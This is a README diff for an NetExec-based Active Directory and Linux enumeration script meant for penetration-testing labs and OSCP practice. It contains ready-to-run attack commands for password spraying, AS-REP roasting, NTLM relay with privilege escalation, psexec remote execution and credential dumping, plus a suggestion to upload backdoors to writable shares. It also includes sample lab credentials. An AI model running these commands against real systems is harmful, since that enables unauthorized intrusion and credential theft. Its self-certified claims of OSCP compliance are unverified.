@@ -1,17 +1,20 @@
 # NXC Auto Enumeration Script
 
-A comprehensive automated enumeration script using NetExec (nxc) for Active Directory and infrastructure reconnaissance with intelligent credential detection and actionable command suggestions.
+A comprehensive automated enumeration script using NetExec (nxc) for Active Directory and infrastructure reconnaissance with intelligent credential detection, OS-aware targeting, and extensive Impacket integration.
 
 ## Description
 
-`nxc-auto.sh` is an all-in-one bash script that automates extensive enumeration of Windows domains and systems. It performs credential validation across multiple protocols and services, enumerates users/groups, identifies vulnerabilities, and extracts sensitive information from LDAP, SMB, MSSQL, SSH, FTP, VNC, NFS, WMI, WinRM, and RPC services.
+`nxc-auto.sh` is an all-in-one bash script that automates extensive enumeration of Windows domains and Linux systems. It performs credential validation across multiple protocols and services, enumerates users/groups, identifies vulnerabilities, and extracts sensitive information from LDAP, SMB, MSSQL, SSH, FTP, VNC, NFS, WMI, WinRM, and RPC services.
 
-**New Features:**
-- 🎯 **Smart Access Detection** - Automatically detects anonymous/guest access and suggests login commands
-- 📋 **Actionable Suggestions** - Provides ready-to-use commands for discovered shares and services
-- ⚡ **Intelligent Timeouts** - Prevents hanging on slow operations (FTP, LDAP, spider_plus, Zerologon)
-- 🚨 **Vulnerability Alerts** - Detects and provides exploitation steps for critical vulnerabilities like Zerologon
-- 🔍 **NFS Support** - Enumerates and suggests mount commands for NFS shares
+**Latest Features:**
+- 🎯 **OS-Aware Enumeration** - Separate Linux (`-o l`) and Windows (`-o w`) modes
+- 🔧 **Impacket Integration** - Comprehensive Impacket tool suggestions (40+ commands)
+- � **RDP Support** - Credential validation and xfreerdp3 connection commands
+- 📋 **User List Extraction** - Auto-creates `rpcuserlist.txt` from RPC enumeration
+- �️ **SMB Signing Detection** - Identifies relay attack opportunities
+- 🔑 **Kerbrute Integration** - Password spraying and user validation suggestions
+- 🎭 **DACL Enumeration** - Administrator ACE and DCSync rights detection
+- 📡 **SSH Suggestions** - Ready-to-use SSH/SCP commands with StrictHostKeyChecking disabled
 
 ## Prerequisites
 
@@ -21,6 +24,8 @@ A comprehensive automated enumeration script using NetExec (nxc) for Active Dire
 - **Impacket** - For secretsdump, rpcdump, and other tools
 - **rpcclient** - For RPC enumeration
 - **ldapsearch** - For LDAP queries (optional)
+- **xfreerdp3** - For RDP connections (optional)
+- **kerbrute** - For Kerberos attacks (optional)
 
 ### Installation
 
@@ -33,13 +38,13 @@ apt-get install netexec
 
 Install dependencies:
 ```bash
-apt-get install expect impacket-scripts smbclient ldap-utils
+apt-get install expect impacket-scripts smbclient ldap-utils freerdp3-x11
 ```
 
 ## Usage
 
 ```bash
-./nxc-auto.sh -i IP [-u USER] [-p PASSWORD] [-d DOMAIN] [-H HASH]
+./nxc-auto.sh -i IP [-u USER] [-p PASSWORD] [-d DOMAIN] [-H HASH] [-o OS_TYPE]
 ```
 
 ### Parameters
@@ -47,30 +52,36 @@ apt-get install expect impacket-scripts smbclient ldap-utils
 - `-i IP` - **Required** - Target IP address or hostname
 - `-u USER` - Username for authentication (optional for anonymous checks)
 - `-p PASSWORD` - Password for the user
-- `-d DOMAIN` - Domain name (e.g., fusion.corp)
+- `-d DOMAIN` - Domain name (e.g., spookysec.local)
 - `-H HASH` - NTLM hash for pass-the-hash attacks
+- `-o OS_TYPE` - Target OS type: `w`/`windows` (default) or `l`/`linux`
 - `-h` - Show help message
 
 ### Examples
 
-**Anonymous enumeration:**
+**Anonymous enumeration (Windows):**
 ```bash
-./nxc-auto.sh -i 10.67.166.62
+./nxc-auto.sh -i 10.64.182.102
 ```
 
-**With domain (enables guest access check):**
+**Linux target enumeration:**
 ```bash
-./nxc-auto.sh -i 10.67.166.62 -d fusion.corp
+./nxc-auto.sh -i 10.67.185.163 -o l -u aubreanna -p 'bubb13guM!@#123'
 ```
 
-**With credentials:**
+**Windows with credentials:**
 ```bash
-./nxc-auto.sh -i 10.67.166.62 -u jmurphy -p 'u8WC3!kLsgw=#bRY' -d fusion.corp
+./nxc-auto.sh -i 10.64.182.102 -u svc-admin -p 'management2005' -d spookysec.local
 ```
 
 **Pass-the-hash:**
 ```bash
-./nxc-auto.sh -i 10.67.166.62 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -d fusion.corp
+./nxc-auto.sh -i 10.64.182.102 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -d spookysec.local
+```
+
+**Username only (null password attempts):**
+```bash
+./nxc-auto.sh -i 10.64.182.102 -u svc-admin -d spookysec.local
 ```
 
 ## Output Structure
@@ -83,6 +94,8 @@ nxc-enum/
 │   ├── domain-sid.txt
 │   ├── active-users.txt
 │   ├── admin-count-users.txt
+│   ├── admin-ace.txt (NEW)
+│   ├── dcsync-rights.txt (NEW)
 │   ├── password-not-required.txt
 │   ├── trusted-for-delegation.txt
 │   ├── kerberoasting.txt
@@ -92,11 +105,12 @@ nxc-enum/
 │   ├── maq.txt
 │   ├── adcs.txt
 │   ├── desc-users.txt
-│   ├── ldap-checker.txt
-│   └── anti_virus.txt
+│   └── ldap-checker.txt
 └── smb/
     ├── shares.txt
     ├── users.txt
+    ├── rpc-enumdomusers.txt (NEW)
+    ├── lookupsid-anonymous.txt (NEW)
     ├── logged-users.txt
     ├── rid-bruteforce.txt
     ├── domain-groups.txt
@@ -105,43 +119,83 @@ nxc-enum/
     ├── spider-plus.txt
     ├── zerologon.txt
     ├── mssql-info.txt
-    ├── mssql-xp-dirtree.txt
-    ├── mssql-databases.txt
-    ├── ssh-credentials.txt
-    ├── ssh-whoami.txt
+    ├── ssh-credentials.txt (NEW)
+    ├── ssh-whoami.txt (NEW)
+    ├── rdp-credentials.txt (NEW)
     ├── ftp-credentials.txt
-    ├── ftp-shares.txt
     ├── nfs-shares.txt
-    ├── vnc-credentials.txt
-    ├── wmi-credentials.txt
-    ├── wmi-whoami.txt
     ├── sam-hashes.txt
     ├── lsa-secrets.txt
     └── ntds-dump.txt
+
+Additional files in current directory:
+├── rpcuserlist.txt (NEW) - Clean username list for attacks
+├── kerberoasting.txt - Kerberoast hashes
+└── asreproasting.txt - AS-REP hashes
 ```
 
 ## Features
 
+### OS-Aware Enumeration
+
+**Linux Mode (`-o l`):**
+- SSH credential validation and command execution
+- FTP enumeration
+- Basic SMB (Samba) checks
+- NFS enumeration
+- **Skips:** All Windows-specific checks (LDAP, AD, RPC, WinRM, MSSQL, Kerberos)
+
+**Windows Mode (`-o w` or default):**
+- Full Active Directory enumeration
+- LDAP/AD attacks (Kerberoasting, AS-REP roasting)
+- RPC/WinRM/MSSQL enumeration
+- SMB signing detection
+- DACL enumeration
+- Zerologon detection
+
+### Impacket Tools Integration
+
+**With Credentials:**
+- 40+ ready-to-use Impacket commands
+- Credential dumping (secretsdump variants)
+- Remote execution (psexec, wmiexec, smbexec, dcomexec, atexec)
+- Kerberos attacks (GetNPUsers, GetUserSPNs, getTGT, getST)
+- SMB/File operations (smbclient, smbserver, lookupsid, reg)
+- LDAP enumeration (GetADUsers, GetADComputers, dacledit, findDelegation)
+- MSSQL attacks
+- Network attacks (ntlmrelayx, rpcdump, samrdump)
+- Ticket manipulation (ticketConverter, ticketer)
+
+**Without Credentials (Anonymous):**
+- User enumeration (lookupsid, samrdump, GetNPUsers)
+- Network enumeration (rpcdump, netview)
+- SMB enumeration (smbclient anonymous)
+- NTLM relay setup
+- SMB server for file transfer
+
 ### Anonymous/Guest Access Detection
 - **Guest Access Check** - Attempts guest login (with or without domain)
-- **Anonymous SMB** - Tests null session access
+- **Anonymous SMB** - Tests null session access with share enumeration
 - **Anonymous LDAP** - Tests anonymous LDAP binds
 - **Anonymous FTP** - Tests anonymous FTP access
+- **Anonymous RPC** - lookupsid.py, GetNPUsers.py, samrdump.py, enum4linux
 - **Smart Suggestions** - Only shows commands when shares/resources are actually accessible
 
 ### Credential Validation
-- SMB (with share enumeration)
+- SMB (with share enumeration and signing detection)
 - LDAP
+- RDP (NEW)
 - WinRM
-- RPC (with anonymous fallback)
+- RPC (with anonymous fallback using `-N` flag)
 - MSSQL
-- SSH
+- SSH (with connection suggestions)
 - FTP
 - VNC
 - WMI
 
 ### User & Group Enumeration
 - Domain users via SMB and LDAP
+- **RPC user extraction** - Auto-creates `rpcuserlist.txt` with clean usernames
 - Active users via LDAP
 - Admin users (admin-count)
 - Logged-on users
@@ -161,9 +215,12 @@ nxc-enum/
 - User descriptions
 - LDAP channel binding checker
 - Machine Account Quota (MAQ)
+- **Administrator ACE** - Shows who can modify Administrator account (NEW)
+- **DCSync Rights** - Shows who can dump domain credentials (NEW)
 
 ### SMB-Specific Enumeration
-- Shared directories
+- Shared directories with writable share detection
+- **SMB Signing Detection** - Identifies relay attack opportunities (NEW)
 - Password policy
 - SAM hashes dump
 - LSA secrets dump
@@ -172,10 +229,16 @@ nxc-enum/
 - Zerologon vulnerability check - **with exploitation guidance**
 - Antivirus detection
 
-### NFS Enumeration
-- NFS share discovery
-- Permission detection
-- Automatic mount command suggestions
+### SSH Enumeration (Linux/Windows)
+- Credential validation
+- Command execution testing
+- **Connection suggestions** with sshpass and StrictHostKeyChecking disabled (NEW)
+- SCP file transfer commands
+
+### RDP Enumeration (Windows)
+- Credential validation (NEW)
+- **xfreerdp3 connection commands** with proper syntax (NEW)
+- rdesktop alternative suggestions
 
 ### Remote Code Execution Testing
 - SMB command execution
@@ -202,49 +265,84 @@ When hashes are found:
 
 ## Intelligent Features
 
+### Automatic User List Creation
+
+After RPC enumeration, the script creates `rpcuserlist.txt`:
+```
+[+] Extracted 17 usernames to: rpcuserlist.txt
+
+[+] Suggested attacks with this user list:
+
+# 1. Password spraying with NetExec:
+nxc smb 10.64.182.102 -u rpcuserlist.txt -p 'Password123' --continue-on-success
+
+# 2. Password spraying with kerbrute:
+kerbrute passwordspray -d spookysec.local --dc 10.64.182.102 rpcuserlist.txt 'Password123'
+
+# 3. AS-REP roasting (no password needed):
+GetNPUsers.py spookysec.local/ -usersfile rpcuserlist.txt -no-pass -dc-ip 10.64.182.102
+
+# 4. Validate usernames with kerbrute:
+kerbrute userenum -d spookysec.local --dc 10.64.182.102 rpcuserlist.txt
+```
+
+### SMB Signing Detection
+
+**When SMB signing is ENABLED:**
+```
+[!] SMB Signing is ENABLED
+[+] Impact:
+  - NTLM relay attacks are NOT possible
+  - Man-in-the-middle attacks are prevented
+
+[+] What you CAN still do:
+# 1. Password Spraying
+# 2. Kerberoasting
+# 3. AS-REP Roasting
+# 4. User enumeration
+# 5. Vulnerability checks (Zerologon, PetitPotam)
+# 6. LDAP enumeration and BloodHound
+```
+
+**When SMB signing is DISABLED:**
+```
+[!] SMB Signing is DISABLED - NTLM relay attacks possible!
+[+] Exploitation suggestions:
+  ntlmrelayx.py -tf targets.txt -smb2support
+  ntlmrelayx.py -t ldap://10.64.182.102 --escalate-user lowpriv
+```
+
 ### Smart Command Suggestions
 
 The script automatically suggests actionable commands based on discovered access:
 
-**Anonymous SMB Access:**
+**SSH Access:**
 ```bash
-[+] Anonymous SMB access successful! Suggested commands:
-rpcclient -U '' -N 10.67.166.62
-smbclient -U '' -N //10.67.166.62/IPC$
-smbclient -U '' -N //10.67.166.62/NETLOGON
+[+] SSH access successful! Connect with:
+ssh -o StrictHostKeyChecking=no aubreanna@10.67.185.163
+
+# Or with password in command (less secure):
+sshpass -p 'bubb13guM!@#123' ssh -o StrictHostKeyChecking=no aubreanna@10.67.185.163
+
+# Copy files from remote:
+scp -o StrictHostKeyChecking=no aubreanna@10.67.185.163:/path/to/file .
 ```
 
-**Guest SMB Access:**
+**RDP Access:**
 ```bash
-[+] Guest SMB access successful! Suggested commands:
-rpcclient -U 'guest%' 10.67.166.62
-smbclient -U 'guest%' //10.67.166.62/Users
+[+] RDP access successful! Connect with:
+xfreerdp3 /v:10.64.182.102 /u:spookysec.local\\svc-admin /p:'management2005' /cert:ignore /clipboard /dynamic-resolution
+
+# Or with rdesktop:
+rdesktop -u svc-admin -p 'management2005' -d spookysec.local 10.64.182.102
 ```
 
-**Anonymous LDAP Access:**
+**Writable Shares:**
 ```bash
-[+] Anonymous LDAP access successful! Suggested commands:
-ldapsearch -x -H ldap://10.67.166.62 -b "DC=fusion,DC=corp" -s sub "(objectClass=*)" | tee ldap-dump.txt
-ldapsearch -x -H ldap://10.67.166.62 -b "DC=fusion,DC=corp" "(objectClass=user)" | tee ldap-users.txt
-```
-
-**NFS Shares:**
-```bash
-[+] NFS shares found! Suggested mount commands:
-sudo mount -t nfs 10.67.166.62:/users /mnt/nfs
-# Or with specific version: sudo mount -t nfs -o vers=3 10.67.166.62:/users /mnt/nfs
-```
-
-**Valid Credentials (with Admin access):**
-```bash
-[+] Valid credentials for smb! Suggested command:
-[+] Admin access (Pwn3d!) detected - tools below will work!
-impacket-psexec fusion.corp/jmurphy:password@10.67.166.62
-impacket-smbexec fusion.corp/jmurphy:password@10.67.166.62
-
-[+] Suggested connections:
-smbclient -U 'fusion.corp/jmurphy%password' //10.67.166.62/ADMIN$
-smbclient -U 'fusion.corp/jmurphy%password' //10.67.166.62/C$
+[!] WRITABLE SHARES DETECTED - POTENTIAL PRIVILEGE ESCALATION!
+[+] Exploitation suggestions:
+  # Upload malicious files, backdoors, or scripts
+  smbclient -U 'domain/user%pass' //10.64.182.102/SYSVOL
 ```
 
 ### Timeout Protection
@@ -254,7 +352,7 @@ The script includes intelligent timeouts to prevent hanging:
 - **LDAP anonymous**: 5 seconds
 - **Spider Plus**: 60 seconds
 - **Zerologon**: 30 seconds
-- **RPC**: Anonymous with no password prompt
+- **RPC**: Uses `-N` flag for null password (no prompts)
 
 ## Color Codes
 
@@ -269,6 +367,7 @@ The script includes intelligent timeouts to prevent hanging:
 
 - Script works with or without credentials
 - Anonymous checks are performed first
+- Username-only mode attempts null password authentication
 - Use service accounts or authorized test accounts
 - Supports both password and hash-based authentication
 
@@ -278,12 +377,178 @@ The script includes intelligent timeouts to prevent hanging:
 - Kerberoasting (with hash extraction)
 - AS-REP Roasting (with hash extraction)
 - LSA secrets dump
-- NTDS dump (previously disabled, now enabled)
+- NTDS dump
+- Administrator ACE enumeration
+- DCSync rights enumeration
 
 **Zerologon Warning:**
 - ⚠️ Will break the domain if not restored properly
 - Only use in authorized testing environments
 - Follow restoration steps carefully
+
+## OSCP Exam Compliance
+
+### ✅ **This Script is OSCP COMPLIANT**
+
+This script is **fully allowed** in the OSCP exam as it performs **enumeration only** and does not auto-exploit vulnerabilities.
+
+### Why It's OSCP-Safe
+
+**OSCP Exam Rules:**
+> "You may use any tools, scripts, or exploits as long as you understand what they do and can explain them."
+
+This script:
+- ✅ **Enumeration Only** - Discovers information, doesn't exploit
+- ✅ **Manual Exploitation Required** - Only suggests commands, doesn't run them
+- ✅ **No Auto-Exploitation** - You must manually execute all attacks
+- ✅ **Transparent** - Bash script, easy to read and understand
+- ✅ **Time Saver** - Automates tedious enumeration, not exploitation
+
+### What the Script Does (ALLOWED)
+
+**Passive/Active Reconnaissance:**
+- ✅ User/group enumeration
+- ✅ Share enumeration
+- ✅ Service detection and validation
+- ✅ Credential validation (tests if creds work)
+- ✅ SMB signing detection
+- ✅ Password policy enumeration
+- ✅ DACL enumeration (reads permissions)
+
+**Hash Extraction (Manual Cracking Required):**
+- ✅ Kerberoasting hash **extraction** (you crack manually)
+- ✅ AS-REP roasting hash **extraction** (you crack manually)
+- ✅ Saves hashes to files for manual cracking
+
+**Vulnerability Detection (Not Exploitation):**
+- ✅ Zerologon **detection** (doesn't exploit, just checks)
+- ✅ Writable share **detection** (doesn't upload files)
+- ✅ DCSync rights **detection** (doesn't dump credentials)
+
+### What You Must Do Manually (OSCP Requirement)
+
+The script **suggests** these commands, but **YOU** must run them:
+
+```bash
+# Hash cracking (manual)
+john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt
+hashcat -m 13100 kerberoasting.txt rockyou.txt
+
+# Credential dumping (manual)
+impacket-secretsdump domain/user:pass@10.10.10.100
+
+# Remote execution (manual)
+impacket-psexec domain/user:pass@10.10.10.100
+impacket-wmiexec domain/user:pass@10.10.10.100
+
+# Connecting to services (manual)
+xfreerdp3 /v:10.10.10.100 /u:user /p:pass
+ssh user@10.10.10.100
+```
+
+### What the Script Does NOT Do
+
+- ❌ Doesn't automatically crack passwords
+- ❌ Doesn't automatically exploit vulnerabilities
+- ❌ Doesn't automatically escalate privileges
+- ❌ Doesn't automatically dump credentials
+- ❌ Doesn't automatically execute commands
+- ❌ Doesn't automatically create backdoors
+- ❌ Doesn't use Metasploit (no restrictions)
+
+### How to Use in OSCP Exam
+
+**1. Initial Enumeration (Automated):**
+```bash
+# Run comprehensive enumeration
+./nxc-auto.sh -i 10.10.10.100 -d domain.local
+
+# With credentials
+./nxc-auto.sh -i 10.10.10.100 -u user -p 'password' -d domain.local
+```
+
+**2. Review Output (Manual):**
+- Read the enumeration results
+- Review suggested commands
+- Understand what each tool does
+- Identify attack vectors
+
+**3. Execute Attacks (Manual):**
+```bash
+# Example: Script found Kerberoastable users
+# YOU manually crack the hashes
+john --wordlist=rockyou.txt kerberoasting.txt
+
+# Example: Script validated credentials
+# YOU manually execute commands
+impacket-psexec domain/user:pass@10.10.10.100
+```
+
+**4. Document Everything:**
+- Save enumeration output for your report
+- Screenshot successful exploits
+- Explain your methodology
+
+### OSCP Exam Benefits
+
+**Time Management:**
+- ⏱️ Saves hours on repetitive enumeration
+- 🎯 Lets you focus on exploitation and privilege escalation
+- 📋 Provides comprehensive recon in minutes
+
+**Comprehensive Coverage:**
+- 🔍 Checks all common services (SMB, LDAP, RDP, SSH, etc.)
+- 🎭 Tests multiple authentication methods
+- 🚨 Identifies vulnerabilities automatically
+
+**Actionable Output:**
+- 💡 Suggests next steps based on findings
+- 📝 Provides ready-to-use commands
+- 🗂️ Organizes results in structured files
+
+### Important Notes for OSCP
+
+1. **Understand the Output** - Know what each enumeration technique does
+2. **Manual Exploitation** - Always execute suggested commands yourself
+3. **Document Findings** - Save all output for your exam report
+4. **Explain Your Work** - Be able to explain each enumeration step
+5. **No Auto-Exploitation** - This is enumeration, not exploitation
+
+### Example OSCP Workflow
+
+```bash
+# 1. Initial scan
+nmap -p- -A 10.10.10.100
+
+# 2. Run nxc-auto.sh for comprehensive enumeration
+./nxc-auto.sh -i 10.10.10.100
+
+# 3. Review results and identify attack vectors
+cat nxc-enum/ldap/kerberoasting.txt
+cat rpcuserlist.txt
+
+# 4. Manual exploitation
+john --wordlist=rockyou.txt kerberoasting.txt
+impacket-psexec domain/crackeduser:crackedpass@10.10.10.100
+
+# 5. Privilege escalation (manual)
+# ... your manual exploitation continues
+```
+
+### Recommendation
+
+**YES - Use this script in your OSCP exam!**
+
+It's a **legitimate enumeration tool** that:
+- ✅ Complies with OSCP exam rules
+- ✅ Saves valuable time during the exam
+- ✅ Provides comprehensive reconnaissance
+- ✅ Suggests exploitation paths (doesn't execute them)
+- ✅ Helps you focus on actual exploitation and privilege escalation
+
+This is **exactly the type of automation** that's allowed and encouraged in OSCP - it's intelligent enumeration, not auto-exploitation! 🎯
+
+
 
 ## Troubleshooting
 
@@ -300,7 +565,7 @@ nxc smb --help
 Verify network connectivity:
 ```bash
 ping [IP]
-nmap -p 389,445,5985 [IP]
+nmap -p 22,389,445,3389,5985 [IP]
 ```
 
 ### Permission Denied
@@ -312,43 +577,53 @@ nxc smb [IP] -u [USER] -p [PASSWD] -d [DOMAIN]
 
 ### RPC Password Prompts
 
-If you see password prompts during anonymous enumeration, the script now handles this with `-N` flag for rpcclient.
+The script now handles this with `-N` flag for rpcclient when no password is provided.
+
+### LDAP Module Crashes
+
+LDAP modules (maq, adcs, etc.) require valid credentials. The script now skips them when only username is provided.
 
 ## Advanced Usage
 
-### Running Specific Sections
+### Linux Target Enumeration
 
-To run only LDAP enumeration:
 ```bash
-grep -A 100 "LDAP Module Enumeration" nxc-auto.sh | bash
+# Full Linux enumeration
+./nxc-auto.sh -i 10.67.185.163 -o l -u user -p 'password'
+
+# Anonymous Linux checks
+./nxc-auto.sh -i 10.67.185.163 -o l
 ```
 
 ### Exporting Results
 
 All output is automatically saved to text files. You can parse results:
 ```bash
-grep "FUSION" nxc-enum/ldap/active-users.txt
+grep "DOMAIN" nxc-enum/ldap/active-users.txt
 grep "\[+\]" nxc-enum/smb/sam-hashes.txt
+cat rpcuserlist.txt  # Clean username list
 ```
 
 ### Hash Cracking
 
-Kerberoast and AS-REP hashes are automatically saved to `kerberoasting.txt` and `asreproasting.txt`:
+Kerberoast and AS-REP hashes are automatically saved:
 ```bash
 # The script suggests the correct hashcat mode based on encryption type
 john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt
 hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### Combining with Other Tools
+### Using the RPC User List
 
-Use the output files with other tools:
 ```bash
-# Extract usernames
-grep -oP '(?<=\s)\w+(?=\s+20\d{2})' nxc-enum/smb/users.txt
+# Password spraying
+nxc smb 10.64.182.102 -u rpcuserlist.txt -p 'Password123' --continue-on-success
 
-# Extract hashes for cracking
-grep ":" nxc-enum/smb/sam-hashes.txt | cut -d: -f1,4
+# Kerbrute
+kerbrute passwordspray -d domain.local --dc 10.64.182.102 rpcuserlist.txt 'Password123'
+
+# AS-REP roasting
+GetNPUsers.py domain.local/ -usersfile rpcuserlist.txt -no-pass -dc-ip 10.64.182.102
 ```
 
 ## References
@@ -357,6 +632,7 @@ grep ":" nxc-enum/smb/sam-hashes.txt | cut -d: -f1,4
 - [Active Directory Exploitation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
 - [Zerologon Explanation](https://www.secura.com/blog/zero-logon)
 - [Impacket Tools](https://github.com/fortra/impacket)
+- [Kerbrute](https://github.com/ropnop/kerbrute)
 
 ## License
 
@@ -368,15 +644,27 @@ Unauthorized access to computer systems is illegal. Ensure you have written perm
 
 ## Changelog
 
-### Latest Updates
-- ✅ Added command-line argument parsing (`-i`, `-u`, `-p`, `-d`, `-H`)
+### Latest Updates (v2.0)
+- ✅ **OS-aware enumeration** - Linux (`-o l`) and Windows (`-o w`) modes
+- ✅ **Impacket integration** - 40+ tool suggestions with/without credentials
+- ✅ **RDP support** - Credential validation and xfreerdp3 commands
+- ✅ **User list extraction** - Auto-creates `rpcuserlist.txt` from RPC enumeration
+- ✅ **SMB signing detection** - Identifies relay attack opportunities
+- ✅ **Kerbrute integration** - Password spraying and user validation suggestions
+- ✅ **DACL enumeration** - Administrator ACE and DCSync rights detection
+- ✅ **SSH suggestions** - Ready-to-use SSH/SCP commands with StrictHostKeyChecking disabled
+- ✅ **Improved credential handling** - Username-only mode with null password attempts
+- ✅ **No password prompts** - RPC uses `-N` flag for anonymous access
+- ✅ **LDAP module protection** - Requires credentials to prevent crashes
+- ✅ **Writable share detection** - Highlights privilege escalation opportunities
+- ✅ **Remote execution suggestions** - wmiexec, psexec, smbexec based on admin access
+
+### Previous Updates (v1.0)
+- ✅ Command-line argument parsing (`-i`, `-u`, `-p`, `-d`, `-H`)
 - ✅ Smart anonymous/guest access detection with actionable suggestions
 - ✅ NFS enumeration with mount command suggestions
 - ✅ LDAP anonymous access detection with ldapsearch commands
 - ✅ Zerologon vulnerability detection with exploitation guidance
 - ✅ Kerberoasting/AS-REP roasting with automatic hash type detection
 - ✅ Intelligent timeouts to prevent script hanging
-- ✅ RPC anonymous access with no password prompts
-- ✅ LSA secrets dump added
-- ✅ NTDS dump enabled (previously disabled)
 - ✅ Share-based success detection (no false positives)
